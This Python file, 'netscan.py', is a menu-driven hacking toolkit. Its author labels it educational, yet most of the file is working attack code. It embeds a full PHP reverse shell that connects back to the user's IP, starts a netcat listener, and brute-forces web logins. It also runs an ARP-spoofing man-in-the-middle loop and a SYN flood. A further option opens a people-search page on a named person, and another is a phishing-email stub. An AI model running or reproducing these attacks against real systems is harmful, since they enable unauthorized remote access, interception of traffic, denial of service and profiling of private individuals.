#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  netscan.py
#  
#  Copyright 2021  <pi@markofficehost>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  use at own risk
#
#  use for edu purposes only
#  made by MarkApppprogammer
#
#If you have an error using scapy 
#cd /usr/lib/x86_64-linux-gnu/ or cd /usr/lib
#ln -s -f libc.a liblibc.a


#imports
from time import sleep
import sys
import subprocess
from scapy.all import *
import scapy.all as scapy
import mechanize
import itertools
import webbrowser


#vars
src_port = 10000 #CHANGE THIS
dst_port = 80
port80open = False

#the code
#all functions
		

def webservertests():
	#asks for IP 
	IP = input("[*] Enter IP of target: ")
	dst_ip = ""
	dst_ip = IP
	sleep(0.5)
	print("[*] Starting network tests")
	sleep(0.5)
	print("[*] Acessing Website..")
	sleep(0.5)
	print("[*] Starting gobuster...")
	wordlistlocation = input("[*] Where is the wordlist you want to use: ")
	command = "gobuster -u " + IP + " -w " + wordlistlocation + ' -s "204,301,302,307,401,403"' #EDIT GOBUSTER COMMAND
	sys.stdout.flush()
	p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	(output, err) = p.communicate()
	newoutput = str(output, 'UTF-8')

	#anlayzing website 
	print("[*] What would you like to do next?")
	print("1-> brute force login")
	print("2-> upload a reverse shell")
	print("3-> Philsing email")
	inputoption = input("[*] Option: ")
	if (inputoption == "1"):
		sleep(0.5)
		url = input("[*] Enter url example:(http://www.example.com/login/&quot): ")
		sleep(0.5)
		redirecturl = input("[*] What url will it redirect to: ")
		sleep(0.5)
		username_field_name = input("[*] Enter the name for the username field: ")
		sleep(0.5)
		password_field_name = input("[*] Enter the name for the username field: ")
		sleep(0.5)
		username = input("[*] Please enter the username:")

		br = mechanize.Browser()
		br.set_handle_equiv(True)
		br.set_handle_redirect(True)
		br.set_handle_referer(True)
		br.set_handle_robots(False)

		combos = itertools.permutations("i3^4hUP-",8) 
		br.open(url)
		for x in combos:	
			br.select_form( nr = 0 )
			br.form[username_field_name] = username
			br.form[password_field_name] = ''.join(x)
			print("Checking " + br.form['password'])
			response=br.submit()
			if response.geturl()== redirecturl:
				#url to which the page is redirected after login
				print("Correct password is " + ''.join(x))
				break

	elif (inputoption == "2"):
		#Getting user info
		sleep(0.5)
		userip = input("[*] Your Ip: ")
		sleep(0.5)
		userport = input("[*] The port you want to listen on: ")
		fp = open('php-reverse-shellcopy.php', 'x')
		sleep(1)
		print("[*] Printing out php file")
		fp.write("""<?php
		// php-reverse-shell - A Reverse Shell implementation in PHP
		// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
		//
		// This tool may be used for legal purposes only.  Users take full responsibility
		// for any actions performed using this tool.  The author accepts no liability
		// for damage caused by this tool.  If these terms are not acceptable to you, then
		// do not use this tool.
		//
		// In all other respects the GPL version 2 applies:
		//
		// This program is free software; you can redistribute it and/or modify
		// it under the terms of the GNU General Public License version 2 as
		// published by the Free Software Foundation.
		//
		// This program is distributed in the hope that it will be useful,
		// but WITHOUT ANY WARRANTY; without even the implied warranty of
		// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
		// GNU General Public License for more details.
		//
		// You should have received a copy of the GNU General Public License along
		// with this program; if not, write to the Free Software Foundation, Inc.,
		// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
		//
		// This tool may be used for legal purposes only.  Users take full responsibility
		// for any actions performed using this tool.  If these terms are not acceptable to
		// you, then do not use this tool.
		//
		// You are encouraged to send comments, improvements or suggestions to
		// me at pentestmonkey@pentestmonkey.net
		//
		// Description
		// -----------
		// This script will make an outbound TCP connection to a hardcoded IP and port.
		// The recipient will be given a shell running as the current user (apache normally).
		//
		// Limitations
		// -----------
		// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
		// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
		// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
		//
		// Usage
		// -----
		// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

		set_time_limit (0);
		$VERSION = "1.0";
		$ip = '%s';  // CHANGE THIS
		$port = %s;       // CHANGE THIS
		$chunk_size = 1400;
		$write_a = null;
		$error_a = null;
		$shell = 'uname -a; w; id; /bin/sh -i';
		$daemon = 0;
		$debug = 0;

		//
		// Daemonise ourself if possible to avoid zombies later
		//

		// pcntl_fork is hardly ever available, but will allow us to daemonise
		// our php process and avoid zombies.  Worth a try...
		if (function_exists('pcntl_fork')) {
			// Fork and have the parent process exit
			$pid = pcntl_fork();
			
			if ($pid == -1) {
				printit("ERROR: Can't fork");
				exit(1);
			}
			
			if ($pid) {
				exit(0);  // Parent exits
			}

			// Make the current process a session leader
			// Will only succeed if we forked
			if (posix_setsid() == -1) {
				printit("Error: Can't setsid()");
				exit(1);
			}

			$daemon = 1;
		} else {
			printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
		}

		// Change to a safe directory
		chdir("/");

		// Remove any umask we inherited
		umask(0);

		//
		// Do the reverse shell...
		//

		// Open reverse connection
		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
		if (!$sock) {
			printit("$errstr ($errno)");
			exit(1);
		}

		// Spawn shell process
		$descriptorspec = array(
		0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
		1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
		2 => array("pipe", "w")   // stderr is a pipe that the child will write to
		);

		$process = proc_open($shell, $descriptorspec, $pipes);

		if (!is_resource($process)) {
			printit("ERROR: Can't spawn shell");
			exit(1);
		}

		// Set everything to non-blocking
		// Reason: Occsionally reads will block, even though stream_select tells us they won't
		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		stream_set_blocking($sock, 0);

		printit("Successfully opened reverse shell to $ip:$port");

		while (1) {
			// Check for end of TCP connection
			if (feof($sock)) {
				printit("ERROR: Shell connection terminated");
				break;
			}

			// Check for end of STDOUT
			if (feof($pipes[1])) {
				printit("ERROR: Shell process terminated");
				break;
			}

			// Wait until a command is end down $sock, or some
			// command output is available on STDOUT or STDERR
			$read_a = array($sock, $pipes[1], $pipes[2]);
			$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

			// If we can read from the TCP socket, send
			// data to process's STDIN
			if (in_array($sock, $read_a)) {
				if ($debug) printit("SOCK READ");
				$input = fread($sock, $chunk_size);
				if ($debug) printit("SOCK: $input");
				fwrite($pipes[0], $input);
			}

			// If we can read from the process's STDOUT
			// send data down tcp connection
			if (in_array($pipes[1], $read_a)) {
				if ($debug) printit("STDOUT READ");
				$input = fread($pipes[1], $chunk_size);
				if ($debug) printit("STDOUT: $input");
				fwrite($sock, $input);
			}

			// If we can read from the process's STDERR
			// send data down tcp connection
			if (in_array($pipes[2], $read_a)) {
				if ($debug) printit("STDERR READ");
				$input = fread($pipes[2], $chunk_size);
				if ($debug) printit("STDERR: $input");
				fwrite($sock, $input);
			}
		}

		fclose($sock);
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);

		// Like print, but does nothing if we've daemonised ourself
		// (I can't figure out how to redirect STDOUT like a proper daemon)
		function printit ($string) {
			if (!$daemon) {
				print "$string\\n";
			}
		}

		?> 


		"""%(userip, userport))
		sleep(1)
		print("[*] Starting netcat...")
		sleep(0.5)
		print("[*] Upolad the file to the website after the command is run")
		command = "nc -v -n -l -p " + userport #EDIT NETCAT COMMAND
		sys.stdout.flush()
		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
		(output, err) = p.communicate()
		newoutput = str(output, 'UTF-8')

		#prints output of netcat
		print ("{}".format(newoutput))
		sleep(0.5)
	elif (inputoption == "3"):
		#asks for stuff
		sleep(0.5)
		subject = input("[*] Enter the Subject: ")
		sleep(0.5)
		body = input("[*] Enter the body: ")
		sleep(0.5)
		username = input("[*] Enter your username: ")
		sleep(0.5)
		password = input("[*] Enter your password: ")
		sleep(0.5)
		homescreen()
#		Expermient
#		toemail = input("[*] Enter email of who you want to send it to:")
#		message = f'Subject: {subject}\n\n{body}'
#
#		#server stuff
# 		server=smtplib.SMTP_SSL('smtp.gmail.com', 465)
#		server.login(username, password)
#	
#		#server send email
#		server.sendmail(
#			username,
#			toemail,
#			message)
#
#		#end it 
#		server.quit()
	else:
		sleep(0.5)
		print("[*] Incorecct option, logging out")
		homescreen()


def nmapscan():
	#asks for IP 
	IP = input("[*] Enter IP of target: ")
	dst_ip = ""
	dst_ip = IP
	sleep(0.5)
	print("[*] Using nmap to scan for vunls...")
	sleep(0.5)
	print("[*] This may take some time...")

	#runs nmap command
	command = "nmap -sC -sV " + IP #EDIT NMAP COMMAND
	sys.stdout.flush()
	p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	(output, err) = p.communicate()
	newoutput = str(output, 'UTF-8')

	#prints output of nmap
	print ("{}".format(newoutput))
	homescreen()

def basicinformationgathering():
	sleep(0.5)
	firstname = input("[*] Enter First name of target: ")
	sleep(0.5)
	lastname = input("[*] Enter Last name of target: ")
	sleep(0.5)
	city = input("[*] Enter city of target (only one space only): ")
	sleep(0.5)
	state = input("[*] Enter state of target ex:(CA): ")
	baseurl = "https://nuwber.com/search?location="
	space = "%20"
	city.replace(" ", "%20")
	city = city + ","
	fullname = firstname + "%20" + lastname
	fullname.replace(" ", "%20")

	#finalurl
	finalurl = baseurl + city + space + state + "&name=" + fullname
	print(f"Opening: ('{finalurl}')")
	webbrowser.open(finalurl)
	homescreen()


def basicnettests():
	sleep(0.5)
	#get Ip
	IPadders = input("[*] Enter IP of gateway: ")
	#choses
	sleep(0.5)
	print("[*] Which would you like to check for:")
	print("1-> mitm(man in the middle) ")
	print("2-> Dos(Denial of service) ")
	inputchoice = input("[*] Chose 1 or 2: ")
	if (inputchoice == "1"):
		sleep(0.5)
		print("[*] Starting mitm...")
		sleep(0.5)
		print("[*] Scanning...")
		sleep(0.5)
		arp_request=scapy.ARP(pdst=IPadders)
		brodcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp=brodcast/arp_request
		answered=scapy.srp(arp, timeout=1,verbose=False)[0]
		for element in answered:
			print("[*] IP of Gateway:{}".format(element[1].psrc))
			print("[*] MAC address of Gateway: {}\n".format(element[1].hwsrc))
			macadders0 = "{}".format(element[1].hwsrc)
			macadders = macadders0
		command = "ip r"#EDIT COMMAND
		sys.stdout.flush()
		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
		(output, err) = p.communicate()
		newoutput = str(output, 'UTF-8')
		print(newoutput)
		print("[*] What is your subnetmask?")
		print("[*] Ex: 192.168.1.0/24")
		subnetmask = input("[*] Subnetmask: ")
		sleep(0.5)
		print("[*] Starting nmap...")
		sleep(0.5)
		command = "nmap " + subnetmask #EDIT COMMAND
		sys.stdout.flush()
		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
		(output, err) = p.communicate()
		newoutput = str(output, 'UTF-8')
		print(newoutput)
		otherip = input("Enter IP of device wanted to spoof: ")
		sleep(0.5)
		arp_request=scapy.ARP(pdst=otherip)
		brodcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp=brodcast/arp_request
		answered=scapy.srp(arp, timeout=1,verbose=False)[0]
		for element in answered:
			print("[*] IP of Target:{}".format(element[1].psrc))
			print("[*] MAC address of Target: {}\n".format(element[1].hwsrc))
			macadders1 = "{}".format(element[1].hwsrc)
			macaddersother = macadders1
		sleep(0.5)

		#spoofing functions
		def spooftarget():
			print("[*] Sending spoofed packets to target...")
			packet = scapy.ARP(op = 2, pdst = otherip, hwdst = macaddersother, psrc = IPadders)
			send(packet, verbose=False)
		
		def spoofgateway():
			print("[*] Sending spoofed packets to router...")
			packet = scapy.ARP(op = 2, pdst = IPadders, hwdst = macadders, psrc = otherip)
			send(packet, verbose=False)

		sent_packets_count = 0
		while True:
			sleep(1)
			spooftarget()
			spoofgateway()
			sent_packets_count = sent_packets_count + 2
			print("[*] Packets sent " + str(sent_packets_count) + " to target and gateway.")
		
	if (inputchoice == "2"):
		sleep(0.5)
		target_ip = input("What is your target ip: ")
		print("[*] Starting SYN Flooding..")
		sleep(2)
		print("[*] Currently isn't working :(...")
		homescreen()
		target_port = 80
		src_IP =  RandIP()

		#writing layeers
		ip = scapy.IP(src = src_IP, dst = target_ip)
		tcp = scapy.TCP(dst_port = target_port, flags = "S")
		raw = Raw(b"X"*1024)

		#combining layers into the packet
		p = ip / tcp / raw

		#loop of sending the packet
		send(p, loop=1, verbose=0)
		homescreen()

def networkscanner():
	sleep(0.5)	
	#asks for IP
	IPadders = input("[*] Enter IP of router: ")
	dst_ip = IPadders	
	dst_ports = [20, 21, 22, 25, 53, 80, 123, 174, 443, 500, 3389]
	dst_ports_status = [False, False, False, False, False, False, False, False, False, False, False]
	src_port = 80
	for port in dst_ports:
		tcp_connect_scan_resp = sr1(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=port,flags="S"),timeout=10)
		if(tcp_connect_scan_resp.haslayer(scapy.TCP)):
			if(tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x12):
				send_rst = sr(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=port,flags="AR"),timeout=10)
				dst_ports_status[dst_ports.index(port)] = True
			elif (tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x14):
				dst_ports_status[dst_ports.index(port)] = False
	for status in dst_ports_status:
		if(status == True):
			dst_ports_status[dst_ports_status.index(status)] = "Open"
		if(status == False):
			dst_ports_status[dst_ports_status.index(status)] = "Closed"
	print("""
	Scanning %s
	PORT:	STATUS:   SERVICE:
	%s      %s	      FTP
	%s      %s        FTP
	%s      %s        SSH
	%s      %s        SMTP
	%s      %s        DNS
	%s      %s        HTTP
	%s     %s        NTP
	%s     %s        BGP
	%s     %s        HTTPS
	%s     %s        ISAKMP
	%s    %s        RDP
	"""%(IPadders, dst_ports[0], dst_ports_status[0], dst_ports[1], dst_ports_status[1], dst_ports[2], dst_ports_status[2], dst_ports[3], dst_ports_status[3], dst_ports[4], dst_ports_status[4], dst_ports[5], dst_ports_status[5], dst_ports[6], dst_ports_status[6], dst_ports[7], dst_ports_status[7], dst_ports[8], dst_ports_status[8], dst_ports[9], dst_ports_status[9], dst_ports[10], dst_ports_status[10]))
	homescreen()

def basicwebtests():
	#sending packets
	#asks for IP 
	IPadders = input("[*] Enter IP: ")
	dst_ip = IPadders
	dst_port = 80
	sleep(0.5)
	print("[*] Checking port vulns using scapy...")
	tcp_connect_scan_resp = sr1(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
	if(tcp_connect_scan_resp.haslayer(scapy.TCP)):
		if(tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x12):
			send_rst = sr(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
			print("[*] Port 80 is Open")
			print("[*] Possibly a web server running on " + IPadders)
			webservertests()
		elif (tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x14):
			print ("[*] Port 80 is closed, trying port 443")
			dst_port = 443
			tcp_connect_scan_resp = sr1(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
			if(tcp_connect_scan_resp.haslayer(scapy.TCP)):
					if(tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x12):
							send_rst = sr(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
							print("[*] Port 443 is Open")
							sleep(0.5)
							print("[*] Possibly a web server running on " + IPadders)
							webservertests()
					elif (tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x14):
							print ("[*] Both Port 80 and Pory 443 are closed on " + IPadders)
							homescreen()


#some design stuff
print(" _   _      _   ____")                  
print("| \ | | ___| |_/ ___|  ___ __ _ _ __  ")
print("|  \| |/ _ \ __\___ \ / __/ _` | '_ \ ")
print("| |\  |  __/ |_ ___) | (_| (_| | | | | ")
print("|_| \_|\___|\__|____/ \___\__,_|_| |_| ")

print('')
print('                    _                   _')
print('                  /_ /|               /_ /|')
print('                 |  | |              |  | |')
print('                 |  | |              |  | |')
print('                 |  | |              |  | |')
print('                 |  | |              |  | |')
print('                 |  | |              |  | |')
print('                 |  | |              |  | |')
print('                 |  | |              |  | |')
print('                +|  |,"--------------|  |+"')
print('              ,"                        ,"|')
print('            ,"                        ,"  |')
print('          ,"                        ,"    |')
print('        ,"                        ,"      |')
print('        +-------------------------+       |')
print('        |                         |      ,"')
print('        |                         |    ,"')
print('        |                         |  ,"')
print('        |                         |,"')
print("        +-------------------------+")

print("")

#home function
def homescreen():
	print("[*] What tests would you like to do: ")
	print("1-> webtests")
	print("2-> Information Gathering ")
	print("3-> networktests")
	print("4-> run a nmap scan")
	print("5-> run a network scan")
	testtype = input("[*] Tests 1 or 2 or 3 or 4 or 5: ")
	if (testtype == "1"):
		basicwebtests()
	elif (testtype == "2"):
		basicinformationgathering()
	elif (testtype == "3"):
		basicnettests()
	elif (testtype == "4"):
		nmapscan()
	elif (testtype == "5"):
		networkscanner()
	else:
		print("[*] Please Enter 1,2,3, or 4: ")
		homescreen()
			
		


#check interface 
print("[*] What interface are you using?")
interface = input("[*] Interface: ")
sleep(0.5)
homescreen()
